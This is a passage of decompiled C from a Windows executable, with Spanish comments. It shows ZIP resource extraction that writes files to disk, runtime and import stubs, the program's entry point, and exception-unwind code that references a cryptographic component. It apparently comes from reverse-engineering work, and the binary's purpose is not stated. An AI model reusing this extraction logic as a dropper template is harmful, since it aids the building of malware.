  uint uVar7;
  BOOL BVar8;
  char *pcVar9;
  char *pcVar10;
  LPCSTR pCVar11;
  CHAR local_33c [260];
  undefined4 local_238 [66];
  uint local_130;
  FILETIME local_12c;
  FILETIME local_124;
  FILETIME local_11c [2];
  char local_10c [260];
  DWORD local_8;
  
  iVar3 = param_4;
  pcVar5 = param_1;
  if (param_4 == 3) {
    if (param_1 != *(char **)((int)this + 4)) {
      if (*(char **)((int)this + 4) != (char *)0xffffffff) {
        FUN_00406a97(*(int *)this);
      }
      puVar2 = *(undefined4 **)this;
      *(undefined4 *)((int)this + 4) = 0xffffffff;
      if ((int)puVar2[1] <= (int)pcVar5) {
        return 0x10000;
      }
      if ((int)pcVar5 < (int)puVar2[4]) {
        FUN_004064e2(puVar2);
      }
      while ((int)(*(undefined4 **)this)[4] < (int)pcVar5) {
        FUN_00406520(*(undefined4 **)this);
      }
      FUN_0040671d(*(undefined4 **)this,*(byte **)((int)this + 0x138));
      *(char **)((int)this + 4) = pcVar5;
    }
    uVar7 = FUN_00406880(*(uint *)this,(int)param_2,param_3,(undefined1 *)((int)&param_1 + 3));
    if ((int)uVar7 < 1) {
      FUN_00406a97(*(int *)this);
      *(undefined4 *)((int)this + 4) = 0xffffffff;
    }
    if (param_1._3_1_ != '\0') {
      return 0;
    }
    if ((int)uVar7 < 1) {
      return ((uVar7 != 0xffffff96) - 1 & 0xfb001000) + 0x5000000;
    }
    return 0x600;
  }
  if ((param_4 != 2) && (param_4 != 1)) {
    return 0x10000;
  }
  if (*(int *)((int)this + 4) != -1) {
    FUN_00406a97(*(int *)this);
  }
  pcVar5 = param_1;
  puVar2 = *(undefined4 **)this;
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if ((int)puVar2[1] <= (int)param_1) {
    return 0x10000;
  }
  if ((int)param_1 < (int)puVar2[4]) {
    FUN_004064e2(puVar2);
  }
  while ((int)(*(undefined4 **)this)[4] < (int)pcVar5) {
    FUN_00406520(*(undefined4 **)this);
  }
  FUN_00406c40(this,(int)pcVar5,local_238);
  pcVar5 = param_2;
  if ((local_130 & 0x10) != 0) {
    if (iVar3 == 1) {
      return 0;
    }
    cVar4 = *param_2;
    if (((cVar4 == '/') || (cVar4 == '\\')) || ((cVar4 != '\0' && (param_2[1] == ':')))) {
      pCVar11 = (LPCSTR)0x0;
    }
    else {
      pCVar11 = (LPCSTR)((int)this + 0x140);
    }
    FUN_00407070(pCVar11,param_2);
    return 0;
  }
  if (iVar3 == 1) goto LAB_00407331;
  cVar4 = *param_2;
  pcVar9 = param_2;
  pcVar10 = param_2;
  while (cVar4 != '\0') {
    if ((cVar4 == '/') || (cVar4 == '\\')) {
      pcVar10 = pcVar9 + 1;
    }
    pcVar1 = pcVar9 + 1;
    pcVar9 = pcVar9 + 1;
    cVar4 = *pcVar1;
  }
  strcpy(local_10c,param_2);
  if (pcVar10 == pcVar5) {
    local_10c[0] = '\0';
LAB_004072e1:
    wsprintfA(local_33c,s__s_s_s_0040f848,(LPCSTR)((int)this + 0x140),local_10c,pcVar10);
    FUN_00407070((LPCSTR)((int)this + 0x140),local_10c);
  }
  else {
    pcVar10[(int)(local_10c + -(int)pcVar5)] = '\0';
    if (((local_10c[0] != '/') && (local_10c[0] != '\\')) &&
       ((local_10c[0] == '\0' || (local_10c[1] != ':')))) goto LAB_004072e1;
    wsprintfA(local_33c,(LPCSTR)&param_2_0040f840,local_10c,pcVar10);
    FUN_00407070((LPCSTR)0x0,local_10c);
  }
  pcVar5 = CreateFileA(local_33c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,local_130,(HANDLE)0x0);
LAB_00407331:
  if (pcVar5 == (char *)0xffffffff) {
    return 0x200;
  }
  param_1 = pcVar5;
  FUN_0040671d(*(undefined4 **)this,*(byte **)((int)this + 0x138));
  if (*(int *)((int)this + 0x13c) == 0) {
    pvVar6 = operator_new(0x4000);
    *(void **)((int)this + 0x13c) = pvVar6;
  }
  param_3 = 0;
  do {
    uVar7 = FUN_00406880(*(uint *)this,*(int *)((int)this + 0x13c),0x4000,
                         (undefined1 *)((int)&param_2 + 3));
    if (uVar7 == 0xffffff96) {
      param_3 = 0x1000;
      goto LAB_0040745a;
    }
    if ((int)uVar7 < 0) break;
    if ((0 < (int)uVar7) &&
       (BVar8 = WriteFile(param_1,*(LPCVOID *)((int)this + 0x13c),uVar7,&local_8,(LPOVERLAPPED)0x0),
       BVar8 == 0)) {
      param_3 = 0x400;
      goto LAB_0040745a;
    }
    if (param_2._3_1_ != '\0') {
      SetFileTime(param_1,&local_124,&local_12c,local_11c);
      goto LAB_0040745a;
    }
  } while (uVar7 != 0);
  param_3 = 0x5000000;
LAB_0040745a:
  if (param_4 != 1) {
    CloseHandle(param_1);
  }
  FUN_00406a97(*(int *)this);
  return param_3;
}



/* Cierra y destruye el contexto de extracción ZIP. */
undefined4 __fastcall FUN_0040747b(int *param_1)

{
  if (param_1[1] != -1) {
    FUN_00406a97(*param_1);
  }
  param_1[1] = -1;
  if ((undefined4 *)*param_1 != (undefined4 *)0x0) {
    FUN_00406162((undefined4 *)*param_1);
  }
  *param_1 = 0;
  return 0;
}



/* Construye el contexto de extracción y abre la fuente de datos. */
undefined4 * FUN_004074a4(void)

{
  void *this;
  undefined4 *this_00;
  undefined4 *puVar1;
  int unaff_EBP;
  
  FUN_004076c8();
  this = operator_new(0x244);
  *(void **)(unaff_EBP + -0x10) = this;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (this == (void *)0x0) {
    this_00 = (undefined4 *)0x0;
  }
  else {
    this_00 = FUN_00407527(this,*(char **)(unaff_EBP + 0x14));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  DAT_0040f938 = FUN_00406b8e(this_00,*(LPCSTR *)(unaff_EBP + 8),*(undefined4 *)(unaff_EBP + 0xc),
                              *(int *)(unaff_EBP + 0x10));
  if (DAT_0040f938 == (int *)0x0) {
    puVar1 = operator_new(8);
    *puVar1 = 1;
    puVar1[1] = this_00;
  }
  else {
    if (this_00 != (undefined4 *)0x0) {
      FUN_00407572((int)this_00);
      operator_delete(this_00);
    }
    puVar1 = (undefined4 *)0x0;
  }
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return puVar1;
}



/* Inicializa campos del contexto ZIP y copia la ruta base opcional. */
undefined4 * __thiscall FUN_00407527(void *this,char *param_1)

{
  size_t sVar1;
  char *_Dest;
  
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  *(undefined4 *)((int)this + 0x134) = 0xffffffff;
  *(undefined4 *)this = 0;
  *(undefined4 *)((int)this + 0x138) = 0;
  *(undefined4 *)((int)this + 0x13c) = 0;
  if (param_1 != (char *)0x0) {
    sVar1 = strlen(param_1);
    _Dest = operator_new(sVar1 + 1);
    *(char **)((int)this + 0x138) = _Dest;
    strcpy(_Dest,param_1);
  }
  return this;
}



/* Libera la ruta base y el buffer temporal del contexto ZIP. */
void __fastcall FUN_00407572(int param_1)

{
  if (*(void **)(param_1 + 0x138) != (void *)0x0) {
    operator_delete(*(void **)(param_1 + 0x138));
  }
  *(undefined4 *)(param_1 + 0x138) = 0;
  if (*(void **)(param_1 + 0x13c) != (void *)0x0) {
    operator_delete(*(void **)(param_1 + 0x13c));
  }
  *(undefined4 *)(param_1 + 0x13c) = 0;
  return;
}



/* Envoltorio que crea el contexto usado por la extracción de recursos. */
void FUN_004075ad(void)

{
  FUN_004074a4();
  return;
}



/* Obtiene metadatos de la entrada indicada o el número total de entradas. */
void __cdecl FUN_004075c4(int *param_1,int param_2,undefined4 *param_3)

{
  *param_3 = 0;
  *(undefined1 *)(param_3 + 1) = 0;
  param_3[0x4a] = 0;
  if (param_1 == (int *)0x0) {
    DAT_0040f938 = 0x10000;
  }
  else if (*param_1 == 1) {
    DAT_0040f938 = FUN_00406c40((void *)param_1[1],param_2,param_3);
  }
  else {
    DAT_0040f938 = 0x80000;
  }
  return;
}



/* Extrae una entrada ZIP al destino indicado. */
void __cdecl FUN_00407603(int *param_1,char *param_2,char *param_3,uint param_4,int param_5)

{
  if (param_1 == (int *)0x0) {
    DAT_0040f938 = 0x10000;
  }
  else if (*param_1 == 1) {
    DAT_0040f938 = FUN_00407136((void *)param_1[1],param_2,param_3,param_4,param_5);
  }
  else {
    DAT_0040f938 = 0x80000;
  }
  return;
}



/* Atajo para extraer una entrada como archivo nuevo. */
void __cdecl FUN_0040763d(int *param_1,char *param_2,char *param_3)

{
  FUN_00407603(param_1,param_2,param_3,0,2);
  return;
}



/* Cierra el extractor y libera su estructura de control. */
undefined4 __cdecl FUN_00407656(int *param_1)

{
  int *piVar1;
  
  if (param_1 == (int *)0x0) {
    DAT_0040f938 = 0x10000;
  }
  else {
    if (*param_1 == 1) {
      piVar1 = (int *)param_1[1];
      DAT_0040f938 = FUN_0040747b(piVar1);
      if (piVar1 != (int *)0x0) {
        FUN_00407572((int)piVar1);
        operator_delete(piVar1);
      }
      operator_delete(param_1);
      return DAT_0040f938;
    }
    DAT_0040f938 = 0x80000;
  }
  return DAT_0040f938;
}



/* Salto de importacion generado por el decompilador para strcpy. */
char * __cdecl strcpy(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076a8. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strcpy(_Dest,_Source);
  return pcVar1;
}



/* Salto de importacion generado por el decompilador para memset. */
void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076ae. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



/* Salto de importacion generado por el decompilador para strlen. */
size_t __cdecl strlen(char *_Str)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076b4. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = strlen(_Str);
  return sVar1;
}



/* Salto del runtime para el manejador de excepciones C++. */
void __CxxFrameHandler(void)

{
                    // WARNING: Could not recover jumptable at 0x004076c0. Too many branches
                    // WARNING: Treating indirect jump as call
  __CxxFrameHandler();
  return;
}



/* Establece el marco de excepciones usado por el codigo descompilado. */
void FUN_004076c8(void)

{
  undefined1 auStack_c [12];
  
  ExceptionList = auStack_c;
  return;
}



/* Salto de importacion generado por el decompilador para operator delete. */
void __cdecl operator_delete(void *param_1)

{
                    // WARNING: Could not recover jumptable at 0x004076e8. Too many branches
                    // WARNING: Treating indirect jump as call
  operator_delete(param_1);
  return;
}



/* Salto de importacion generado por el decompilador para memcmp. */
int __cdecl memcmp(void *_Buf1,void *_Buf2,size_t _Size)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076ee. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = memcmp(_Buf1,_Buf2,_Size);
  return iVar1;
}



/* Salto del runtime para deshacer marcos de excepcion locales. */
void __cdecl local_unwind2(void)

{
                    // WARNING: Could not recover jumptable at 0x004076fa. Too many branches
                    // WARNING: Treating indirect jump as call
  local_unwind2();
  return;
}



/* Salto de importacion generado por el decompilador para operator new. */
void * __cdecl operator_new(uint param_1)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407700. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = operator_new(param_1);
  return pvVar1;
}



/* Salto de importacion generado por el decompilador para memcpy. */
void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407706. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}



/* Salto de importacion generado por el decompilador para strcmp. */
int __cdecl strcmp(char *_Str1,char *_Str2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407740. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = strcmp(_Str1,_Str2);
  return iVar1;
}



/* Salto del runtime para lanzar una excepcion C++. */
void _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)

{
                    // WARNING: Could not recover jumptable at 0x0040776e. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  _CxxThrowException(pExceptionObject,pThrowInfo);
  return;
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio

/* Multiplicacion de enteros de 64 bits usada por conversiones de tiempo. */
longlong __allmul(uint param_1,int param_2,uint param_3,int param_4)

{
  if (param_4 == 0 && param_2 == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



/* Salto de importacion generado por el decompilador para strcat. */
char * __cdecl strcat(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x004077b4. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strcat(_Dest,_Source);
  return pcVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

/* Punto de entrada PE: inicializa el runtime y delega en FUN_00401fe7. */
void entry(void)

{
  undefined4 *puVar1;
  byte *pbVar2;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined1 *local_1c;
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_0040d488;
  puStack_10 = &DAT_004076f4;
  pvStack_14 = ExceptionList;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  ExceptionList = &pvStack_14;
  __set_app_type(2);
  _DAT_0040f94c = 0xffffffff;
  _DAT_0040f950 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_0040f948;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_0040f944;
  _DAT_0040f954 = *(undefined4 *)_adjust_fdiv_exref;
  FUN_0040793f();
  if (DAT_0040f870 == 0) {
    __setusermatherr(&LAB_0040793c);
  }
  FUN_0040792a();
  initterm(&DAT_0040e008,&DAT_0040e00c);
  local_70.newmode = DAT_0040f940;
  __getmainargs(&local_64,&local_74,&local_68,_DoWildCard_0040f93c,&local_70);
  initterm(&DAT_0040e000,&DAT_0040e004);
  pbVar2 = *(byte **)_acmdln_exref;
  if (*pbVar2 != 0x22) {
    do {
      if (*pbVar2 < 0x21) goto LAB_004078ad;
      pbVar2 = pbVar2 + 1;
    } while( true );
  }
  do {
    pbVar2 = pbVar2 + 1;
    if (*pbVar2 == 0) break;
  } while (*pbVar2 != 0x22);
  if (*pbVar2 != 0x22) goto LAB_004078ad;
  do {
    pbVar2 = pbVar2 + 1;
LAB_004078ad:
  } while ((*pbVar2 != 0) && (*pbVar2 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  GetModuleHandleA((LPCSTR)0x0);
  local_6c = FUN_00401fe7();
                    // WARNING: Subroutine does not return
  exit(local_6c);
}



/* Destructor delegado del tipo RTTI generado por el compilador. */
void __thiscall type_info::~type_info(type_info *this)

{
                    // WARNING: Could not recover jumptable at 0x00407918. Too many branches
                    // WARNING: Treating indirect jump as call
  ~type_info(this);
  return;
}



/* Filtro de excepciones estructuradas del runtime de Visual C++. */
int __cdecl _XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040791e. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = _XcptFilter(_ExceptionNum,_ExceptionPtr);
  return iVar1;
}



/* Inicializa o finaliza tablas globales del runtime de Visual C++. */
void __cdecl initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x00407924. Too many branches
                    // WARNING: Treating indirect jump as call
  initterm();
  return;
}



/* Configura el modo de redondeo/control de punto flotante del runtime. */
void FUN_0040792a(void)

{
  _controlfp(0x10000,0x30000);
  return;
}



/* Inicializador vacio generado por el runtime de Visual C++. */
void FUN_0040793f(void)

{
  return;
}



/* Salto del runtime para configurar el entorno de punto flotante. */
uint __cdecl _controlfp(uint _NewValue,uint _Mask)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407940. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp(_NewValue,_Mask);
  return uVar1;
}



/* Rutina de limpieza de la primera seccion critica durante una excepcion. */
void Unwind_00407950(void)

{
  int unaff_EBP;
  
  FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}



/* Rutina de limpieza de la segunda seccion critica durante una excepcion. */
void Unwind_0040795b(void)

{
  int unaff_EBP;
  
  FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
  return;
}



/* Variante de limpieza de la primera seccion critica. */
void Unwind_00407970(void)

{
  int unaff_EBP;
  
  FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}



/* Variante de limpieza de la segunda seccion critica. */
void Unwind_0040797b(void)

{
  int unaff_EBP;
  
  FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
  return;
}



/* Limpia el subobjeto criptografico durante el desenrollado de excepciones. */
void Unwind_00407986(void)

{
  int unaff_EBP;
  
  FUN_00402a6f((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x54));
  return;
}



/* Libera la instancia principal durante el desenrollado de excepciones. */
void Unwind_0040799c(void)

{
  int unaff_EBP;
  
  operator_delete(*(void **)(unaff_EBP + -0x10));
  return;
}


